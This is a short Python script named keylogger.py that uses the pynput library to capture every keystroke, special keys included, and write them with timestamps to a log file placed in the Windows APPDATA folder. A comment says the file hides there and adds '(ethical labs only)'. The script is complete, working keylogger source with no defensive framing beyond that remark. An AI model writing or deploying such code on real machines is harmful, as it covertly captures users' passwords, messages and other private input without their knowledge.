# keylogger.py
from pynput import keyboard
import logging
import os

# Set up the log file
log_directory = os.getenv("APPDATA")  # Hides in AppData (ethical labs only)
log_file = os.path.join(log_directory, "keylog.txt")

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key Pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special Key: {key}')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
